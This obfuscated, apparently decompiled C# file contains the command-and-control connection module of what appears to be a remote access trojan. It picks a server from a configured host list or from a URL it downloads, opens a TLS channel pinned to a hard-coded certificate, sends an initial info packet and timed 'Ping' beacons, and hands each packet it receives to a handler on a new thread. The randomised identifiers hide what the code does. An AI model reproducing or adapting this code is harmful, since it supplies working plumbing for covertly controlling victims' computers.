using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using XQTTiTqzQXXI;
using YDfIqHIitkNiPV;
using ktQiwKnbqDow;
using rKqbOBEzRh;

namespace TWpTmyPaElwafc;

public static class pWNWCMPowAyznM
{
	public static Socket laBUOXnieOGoz { get; set; }

	public static SslStream FnslnmdlfCOFx { get; set; }

	private static byte[] MwouONbqoQRlkh { get; set; }

	private static long ZSnFHQLLLqKhK { get; set; }

	private static long RqfYRSDaajSUM { get; set; }

	private static Timer vkuHjIiVwmcd { get; set; }

	public static bool WLmAnmvHeYS { get; set; }

	private static object HYmteCTidhyeEj { get; }

	private static Timer IpuJpBlNMMrUm { get; set; }

	public static int aHArDdXVSgN { get; set; }

	public static bool EkPZZPZxPeHF { get; set; }

	public static void xjTuFdgTpdrDIL()
	{
		try
		{
			laBUOXnieOGoz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			if (OOyHmWyLirxV.WOtgGEJilCgqVzNd == "null")
			{
				string text = OOyHmWyLirxV.SpJXuaZtuzo.Split(new char[1] { ',' })[new Random().Next(OOyHmWyLirxV.SpJXuaZtuzo.Split(new char[1] { ',' }).Length)];
				int port = Convert.ToInt32(OOyHmWyLirxV.zStFDOVIlmBGdNoa.Split(new char[1] { ',' })[new Random().Next(OOyHmWyLirxV.zStFDOVIlmBGdNoa.Split(new char[1] { ',' }).Length)]);
				if (rbPsENwdnEYn(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress address in hostAddresses)
					{
						try
						{
							laBUOXnieOGoz.Connect(address, port);
							if (laBUOXnieOGoz.Connected)
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					laBUOXnieOGoz.Connect(text, port);
				}
			}
			else
			{
				using WebClient webClient = new WebClient();
				NetworkCredential networkCredential = (NetworkCredential)(webClient.Credentials = new NetworkCredential("", ""));
				string[] array = webClient.DownloadString(OOyHmWyLirxV.WOtgGEJilCgqVzNd).Split(new string[1] { ":" }, StringSplitOptions.None);
				OOyHmWyLirxV.SpJXuaZtuzo = array[0];
				OOyHmWyLirxV.zStFDOVIlmBGdNoa = array[new Random().Next(1, array.Length)];
				laBUOXnieOGoz.Connect(OOyHmWyLirxV.SpJXuaZtuzo, Convert.ToInt32(OOyHmWyLirxV.zStFDOVIlmBGdNoa));
			}
			if (laBUOXnieOGoz.Connected)
			{
				WLmAnmvHeYS = true;
				FnslnmdlfCOFx = new SslStream(new NetworkStream(laBUOXnieOGoz, ownsSocket: true), leaveInnerStreamOpen: false, mphRlXbSxs);
				FnslnmdlfCOFx.AuthenticateAsClient(laBUOXnieOGoz.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				ZSnFHQLLLqKhK = 4L;
				MwouONbqoQRlkh = new byte[ZSnFHQLLLqKhK];
				RqfYRSDaajSUM = 0L;
				vhbpvHrZScvimg(gwzHUqyCURbw.aUoYadofyqGw());
				aHArDdXVSgN = 0;
				EkPZZPZxPeHF = false;
				vkuHjIiVwmcd = new Timer(IDZlmyuqhj, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				IpuJpBlNMMrUm = new Timer(MTsjbRFysHiXj, null, 1, 1);
				FnslnmdlfCOFx.BeginRead(MwouONbqoQRlkh, (int)RqfYRSDaajSUM, (int)ZSnFHQLLLqKhK, JkPqEyFaIb, null);
			}
			else
			{
				WLmAnmvHeYS = false;
			}
		}
		catch
		{
			WLmAnmvHeYS = false;
		}
	}

	private static bool rbPsENwdnEYn(string YMmdNfDfFng)
	{
		return Uri.CheckHostName(YMmdNfDfFng) != UriHostNameType.Unknown;
	}

	private static bool mphRlXbSxs(object MShLMaxiZpnYmu, X509Certificate tryvewMsWDDG, X509Chain XdoAIvRMLVPEoF, SslPolicyErrors KFlvYWCnEFLPCxLaj)
	{
		return OOyHmWyLirxV.OxzbTkIXfgdBL.Equals(tryvewMsWDDG);
	}

	public static void jurWVJuYMIBC()
	{
		try
		{
			FnslnmdlfCOFx?.Dispose();
			laBUOXnieOGoz?.Dispose();
			IpuJpBlNMMrUm?.Dispose();
			vkuHjIiVwmcd?.Dispose();
		}
		catch
		{
		}
		WLmAnmvHeYS = false;
	}

	public static void JkPqEyFaIb(IAsyncResult fdsOLGJOkYpVp)
	{
		try
		{
			if (laBUOXnieOGoz.Connected && WLmAnmvHeYS)
			{
				int num = FnslnmdlfCOFx.EndRead(fdsOLGJOkYpVp);
				if (num > 0)
				{
					RqfYRSDaajSUM += num;
					ZSnFHQLLLqKhK -= num;
					if (ZSnFHQLLLqKhK == 0L)
					{
						ZSnFHQLLLqKhK = BitConverter.ToInt32(MwouONbqoQRlkh, 0);
						if (ZSnFHQLLLqKhK > 0L)
						{
							RqfYRSDaajSUM = 0L;
							MwouONbqoQRlkh = new byte[ZSnFHQLLLqKhK];
							while (ZSnFHQLLLqKhK > 0L)
							{
								int num2 = FnslnmdlfCOFx.Read(MwouONbqoQRlkh, (int)RqfYRSDaajSUM, (int)ZSnFHQLLLqKhK);
								if (num2 > 0)
								{
									RqfYRSDaajSUM += num2;
									ZSnFHQLLLqKhK -= num2;
									if (ZSnFHQLLLqKhK < 0L)
									{
										WLmAnmvHeYS = false;
										return;
									}
									continue;
								}
								WLmAnmvHeYS = false;
								return;
							}
							new Thread(AyjlGwqvgbad.BbkzCplAcfvVI).Start(MwouONbqoQRlkh);
							RqfYRSDaajSUM = 0L;
							ZSnFHQLLLqKhK = 4L;
							MwouONbqoQRlkh = new byte[ZSnFHQLLLqKhK];
						}
						else
						{
							ZSnFHQLLLqKhK = 4L;
							MwouONbqoQRlkh = new byte[ZSnFHQLLLqKhK];
							RqfYRSDaajSUM = 0L;
						}
					}
					else if (ZSnFHQLLLqKhK < 0L)
					{
						WLmAnmvHeYS = false;
						return;
					}
					FnslnmdlfCOFx.BeginRead(MwouONbqoQRlkh, (int)RqfYRSDaajSUM, (int)ZSnFHQLLLqKhK, JkPqEyFaIb, null);
				}
				else
				{
					WLmAnmvHeYS = false;
				}
			}
			else
			{
				WLmAnmvHeYS = false;
			}
		}
		catch
		{
			WLmAnmvHeYS = false;
		}
	}

	public static void vhbpvHrZScvimg(byte[] ECcchMAtHnXohX)
	{
		lock (HYmteCTidhyeEj)
		{
			try
			{
				if (!WLmAnmvHeYS)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(ECcchMAtHnXohX.Length);
				laBUOXnieOGoz.Poll(-1, SelectMode.SelectWrite);
				FnslnmdlfCOFx.Write(bytes, 0, bytes.Length);
				if (ECcchMAtHnXohX.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(ECcchMAtHnXohX))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							laBUOXnieOGoz.Poll(-1, SelectMode.SelectWrite);
							FnslnmdlfCOFx.Write(array, 0, num);
							FnslnmdlfCOFx.Flush();
						}
						return;
					}
				}
				laBUOXnieOGoz.Poll(-1, SelectMode.SelectWrite);
				FnslnmdlfCOFx.Write(ECcchMAtHnXohX, 0, ECcchMAtHnXohX.Length);
				FnslnmdlfCOFx.Flush();
			}
			catch
			{
				WLmAnmvHeYS = false;
			}
		}
	}

	public static void IDZlmyuqhj(object AJHTPkRAnkIXLG)
	{
		try
		{
			UsnwLsVggjVevszVi usnwLsVggjVevszVi = new UsnwLsVggjVevszVi();
			usnwLsVggjVevszVi.twuQjjnvvWt("Packet").dQdRsEbxlbxwL = "Ping";
			usnwLsVggjVevszVi.twuQjjnvvWt("Message").dQdRsEbxlbxwL = oEzmcrieBfuvH.oWJPqhLtncf();
			vhbpvHrZScvimg(usnwLsVggjVevszVi.mTRfDZbSUzkmH());
			GC.Collect();
			EkPZZPZxPeHF = true;
		}
		catch
		{
		}
	}

	private static void MTsjbRFysHiXj(object xLEFzuPkDNmTpL)
	{
		try
		{
			if (EkPZZPZxPeHF && WLmAnmvHeYS)
			{
				aHArDdXVSgN++;
			}
		}
		catch
		{
		}
	}

	static pWNWCMPowAyznM()
	{
		_003CSendSync_003Ek__BackingField = new object();
	}
}
